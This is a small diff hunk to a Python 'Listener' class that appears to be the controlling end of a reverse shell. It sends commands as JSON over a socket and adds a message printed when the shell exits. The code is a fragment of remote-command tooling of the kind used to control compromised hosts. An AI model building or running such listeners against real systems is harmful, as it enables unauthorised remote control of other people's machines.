@@ -27,13 +27,14 @@ class Listener:
                 return json.loads(json_data)
             except ValueError:
                 continue
-
+                
     def execute_remotely(self, command):
         # self.connection.send(command)
         # return self.connection.recv(2048).decode()
         self.send_json(command)
         if(command[0].lower() == "exit"):
             self.connection.close()
+            print("[+] Exiting shell. . .")
             exit()
         return self.receive_json()
 
